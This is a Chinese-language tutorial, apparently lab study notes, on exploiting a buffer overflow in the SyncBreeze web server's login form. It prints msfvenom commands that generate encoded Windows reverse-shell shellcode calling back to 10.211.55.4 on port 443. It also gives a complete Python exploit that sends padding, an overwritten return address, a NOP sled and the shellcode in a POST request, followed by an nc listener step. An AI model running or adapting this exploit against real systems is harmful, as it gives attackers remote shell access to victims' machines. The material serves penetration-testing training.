当我们不能使用通用shellcode时，我们必须对它进行编码以适应我们的目标开发环境。这可能意味着将我们的shell代码转换为纯字母数字的有效负载，去除不好的字符，等等。

我们将使用一个先进的多态编码器shikata_ga_nai,编码我们的shellcode，也将用-b选项通知编码器已知的坏字符:

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.211.55.4 LPORT=443 -f c -e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
```

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1605372212932-2e667f90-3e48-4efd-b27a-88064bed363e.png)

最后生成的shellcode不包含坏字符，然后大小为351个字节，shellcode执行后会对10.211.55.4主机上的443端口发起一个反向shell。

### 获取shell

从SyncBreeze获得一个反向shell现在应该很简单，只需用shellcode替换我们的D缓冲区并启动我们的攻击。

然而，在这个特殊情况下，我们还有另一个障碍需要克服。在前面的步骤中，我们使用msfvenom生成了一个经过编码的shellcode。由于编码的原因，shellcode不是直接可执行的，因此被一个解码器存根作为前缀。这个存根的工作是遍历编码的shellcode字节，并将它们解码回原始的可执行形式。为了执行这项任务，解码器需要在内存中收集它的地址，并从那里向前查找几个字节，以找到它需要解码的已编码的shellcode。作为收集解码器存根在内存中的位置过程的一部分，代码执行汇编指令序列，这些指令通常称为GetPC例程。这实际上是一个简短的例程，它将EIP寄存器(有时称为程序计数器或PC)的值移动到另一个寄存器。

与其他GetPC例程一样，shikata_ga_nai使用的那些例程有一个不幸的副作用，即在堆栈顶部或周围写入一些数据。这最终会破坏ESP寄存器所指向的地址附近的至少几个字节。不幸的是，堆栈上的这个小变化对我们来说是个问题，因为解码器正好从ESP寄存器所指向的地址开始。简而言之，GetPC例程的执行最终更改了解码器本身的几个字节(可能还更改了已编码的shell代码)，这最终导致解码过程失败并使目标进程崩溃。

避免这个问题的一种方法是，在执行解码器之前，使用汇编指令(如DEC ESP, SUB ESP, 0xXX)反向调整ESP。或者，我们可以为JMP ESP创建一个宽的“着陆平台”，这样当执行落在这个平台的任何地方时，它将继续在我们的负载上。这听起来可能很复杂，但我们只是在载荷之前加上一系列无操作(或NOP)指令，其操作码值为0x90。顾名思义，这些指令什么都不做，只是简单地将执行传递给下一条指令。通过这种方式使用，这些指令(也被定义为NOP雪橇或NOP滑梯)将让CPU通过NOP“滑梯”，直到到达有效负载。

在这两种情况下，当执行到达shellcode解码器时，堆栈指针指向离它足够远的地方，以便在GetPC例程覆盖堆栈上的一些字节时不会破坏shellcode。

> 这里大概的意思就是，因为对shellcode进行了编码，所以不能直接运行，会在对方机器上进行接码，而解码的同时有可能会导致ESP周围的值发生变化，所以我么可以采用NOP指令用来填充

最终的利用代码如下：

```
#! /usr/bin/python
import socket

try:
    print("Sending evil buffer...")
    shellcode = "\xd9\xe5\xba\xd7\xdb\xcc\x1c\xd9\x74\x24\xf4\x5d\x31\xc9\xb1\x52\x83\xc5\x04\x31\x55\x13\x03\x82\xc8\x2e\xe9\xd0\x07\x2c\x12\x28\xd8\x51\x9a\xcd\xe9\x51\xf8\x86\x5a\x62\x8a\xca\x56\x09\xde\xfe\xed\x7f\xf7\xf1\x46\x35\x21\x3c\x56\x66\x11\x5f\xd4\x75\x46\xbf\xe5\xb5\x9b\xbe\x22\xab\x56\x92\xfb\xa7\xc5\x02\x8f\xf2\xd5\xa9\xc3\x13\x5e\x4e\x93\x12\x4f\xc1\xaf\x4c\x4f\xe0\x7c\xe5\xc6\xfa\x61\xc0\x91\x71\x51\xbe\x23\x53\xab\x3f\x8f\x9a\x03\xb2\xd1\xdb\xa4\x2d\xa4\x15\xd7\xd0\xbf\xe2\xa5\x0e\x35\xf0\x0e\xc4\xed\xdc\xaf\x09\x6b\x97\xbc\xe6\xff\xff\xa0\xf9\x2c\x74\xdc\x72\xd3\x5a\x54\xc0\xf0\x7e\x3c\x92\x99\x27\x98\x75\xa5\x37\x43\x29\x03\x3c\x6e\x3e\x3e\x1f\xe7\xf3\x73\x9f\xf7\x9b\x04\xec\xc5\x04\xbf\x7a\x66\xcc\x19\x7d\x89\xe7\xde\x11\x74\x08\x1f\x38\xb3\x5c\x4f\x52\x12\xdd\x04\xa2\x9b\x08\x8a\xf2\x33\xe3\x6b\xa2\xf3\x53\x04\xa8\xfb\x8c\x34\xd3\xd1\xa4\xdf\x2e\xb2\xc0\xcc\x07\x46\xbd\xf0\x67\x47\x86\x7c\x81\x2d\xe8\x28\x1a\xda\x91\x70\xd0\x7b\x5d\xaf\x9d\xbc\xd5\x5c\x62\x72\x1e\x28\x70\xe3\xee\x67\x2a\xa2\xf1\x5d\x42\x28\x63\x3a\x92\x27\x98\x95\xc5\x60\x6e\xec\x83\x9c\xc9\x46\xb1\x5c\x8f\xa1\x71\xbb\x6c\x2f\x78\x4e\xc8\x0b\x6a\x96\xd1\x17\xde\x46\x84\xc1\x88\x20\x7e\xa0\x62\xfb\x2d\x6a\xe2\x7a\x1e\xad\x74\x83\x4b\x5b\x98\x32\x22\x1a\xa7\xfb\xa2\xaa\xd0\xe1\x52\x54\x0b\xa2\x63\x1f\x11\x83\xeb\xc6\xc0\x91\x71\xf9\x3f\xd5\x8f\x7a\xb5\xa6\x6b\x62\xbc\xa3\x30\x24\x2d\xde\x29\xc1\x51\x4d\x49\xc0"    
    pre = 'A'*780
    eip = "\x83\x0c\x09\x10"
    offset = 'C'*4
    nop = "\x90"*10
    inputBuffer = pre + eip + offset + nop + shellcode
    buffer = ""
    content = "username="+inputBuffer+"&password=A"
    buffer += "POST /login HTTP/1.1\r\n"
    buffer += "Host: 10.211.55.8\r\n"
    buffer += "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\r\n"
    buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
    buffer += "Accept-Language: en-US,en;q=0.5\r\n"
    buffer += "Accept-Encoding: gzip, deflate\r\n"
    buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
    buffer += "Origin: http://10.211.55.8\r\n"
    buffer += "Connection: close\r\n"
    buffer += "Referer: http://10.211.55.8/login\r\n"
    buffer += "Upgrade-Insecure-Requests: 1\r\n"
    buffer += "Content-Length: " + str(len(content)) + "\r\n"
    buffer += "\r\n"
    buffer += content

    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("10.211.55.8",80))
    s.send(buffer)                                                                                  
    s.close()                                                                                       
    print("Done!")                                                                                  
except Exception as e:                                                                              
    print(e)                                                                                        
    print("something wrong") 
```

一个终端开启nc监听443端口，一个终端执行脚本：

![image.png](https://cdn.nlark.com/yuque/0/2020/png/2398693/1605374211076-29f3901b-2e36-4d0d-9d0f-8d05668e829f.png)

### 提高这个exploit

Metasploit shell代码执行后的默认退出方法是ExitProcess API。当反向shell终止时，此退出方法将关闭整个web服务进程，有效地杀死SyncBreeze服务并导致其崩溃。

如果我们正在利用的程序是一个线程化的应用程序，在这种情况下，我们可以尝试通过使用ExitThread API来避免服务完全崩溃，这只会终止受影响的程序线程。这将使我们的攻击工作，而不会中断SyncBreeze服务器的正常操作，并将允许我们重复利用服务器和退出shell，而不会关闭服务。

为了指示msfvenom在shellcode生成过程中使用ExitThread方法，我们可以使用EXITFUNC=thread选项，如下面的命令所示:

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.211.55.4 LPORT=443 EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\3d"
```

大家可以自己结合之前的步骤试验一下。